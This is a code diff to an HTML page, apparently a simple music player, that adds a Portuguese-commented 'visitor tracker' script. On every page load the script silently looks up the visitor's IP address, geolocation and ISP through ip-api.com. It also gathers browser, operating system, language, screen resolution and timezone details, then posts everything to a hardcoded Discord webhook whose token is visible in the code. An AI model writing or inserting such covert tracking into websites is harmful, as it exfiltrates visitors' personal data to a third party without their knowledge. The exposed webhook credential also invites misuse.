@@ -450,10 +450,83 @@
       btnPlayPause.textContent = '▶';
       disc.style.animationPlayState = 'paused';
     });
-  </script>
+
+
+     <!-- SCRIPT DE RASTREAMENTO COM WEBHOOK DO DISCORD -->
+    <script>
+        // *** IMPORTANTE: SUBSTITUA 'SUA_URL_DO_WEBHOOK_AQUI' PELA URL REAL DO SEU WEBHOOK DO DISCORD ***
+        const webhookUrl = "https://discord.com/api/webhooks/1430669444635689043/lNP8vyLRsAUHfp2K9c86aUWEju2aIl013DXSIGl6rRpZSQE61Enev6NigtgpQ7FusbhB";
+
+        // Função para enviar a mensagem para o Discord
+        function enviarParaDiscord(embed) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: "Rastreador de Visitantes", // Nome que aparecerá no Discord
+                    avatar_url: "https://i.imgur.com/oA33a9S.png", // URL de uma imagem de avatar (opcional)
+                    embeds: [embed] // A mensagem formatada que criamos
+                }),
+            }).catch(error => console.error('Erro ao enviar para o Discord:', error));
+        }
+
+        // Coletar dados de IP e Localização usando a API
+        fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query')
+            .then(response => response.json())
+            .then(data => {
+                if (data.status !== 'success') {
+                    console.error('Falha ao obter dados de IP:', data.message);
+                    return;
+                }
+
+                // Coletar dados do navegador
+                const userAgent = navigator.userAgent;
+                const dispositivo = userAgent.match(/Mobile|Tablet|iPad|iPhone|Android/i) ? 'Mobile' : 'Desktop';
+                const navegador = userAgent.match(/Chrome|Firefox|Safari|Edge|OPR/i)?.[0] || 'Desconhecido';
+                const so = userAgent.match(/Windows|Mac|Linux|Android|iPhone/i)?.[0] || 'Desconhecido';
+                const plataforma = navigator.platform || 'Desconhecido';
+                const resolucao = `${window.screen.width}x${window.screen.height}`;
+                const idioma = navigator.language || 'Desconhecido';
+                const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido';
+                const dataAcesso = new Date();
+                const dataFormatada = dataAcesso.toLocaleDateString('pt-BR', { year: 'numeric', month: '2-digit', day: '2-digit' });
+                const horaFormatada = dataAcesso.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+                // Montar a mensagem bonita (embed) para o Discord
+                const embed = {
+                    title: "🕵️‍♂️ Novo Visitante Detectado!",
+                    color: 5814783, // Cor azul (em formato decimal)
+                    fields: [
+                        { name: "🌐 Endereço IP", value: `\`${data.query}\``, inline: true },
+                        { name: "📍 Localização", value: `${data.city}, ${data.regionName}, ${data.country}`, inline: true },
+                        { name: "📡 Provedor", value: data.isp, inline: false },
+                        { name: "💻 Dispositivo", value: dispositivo, inline: true },
+                        { name: "🌍 Navegador", value: navegador, inline: true },
+                        { name: "⚙️ Sistema Operacional", value: so, inline: true },
+                        { name: "🖥️ Plataforma", value: plataforma, inline: true },
+                        { name: "🗣️ Idioma", value: idioma, inline: true },
+                        { name: "📺 Resolução", value: resolucao, inline: true },
+                        { name: "⏰ Fuso Horário", value: fusoHorario, inline: false },
+                        { name: "🗓️ Data/Hora do Acesso", value: `${dataFormatada}, ${horaFormatada}`, inline: false }
+                    ],
+                    footer: {
+                        text: `IP Tracker System 📊 • Hoje às ${dataAcesso.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}`
+                    }
+                };
+
+                // Enviar para o Discord
+                enviarParaDiscord(embed);
+            })
+            .catch(error => {
+                console.error('Erro ao buscar ou enviar dados:', error);
+            });
+    </script>
 
 </body>
 </html>
+
 
 
 
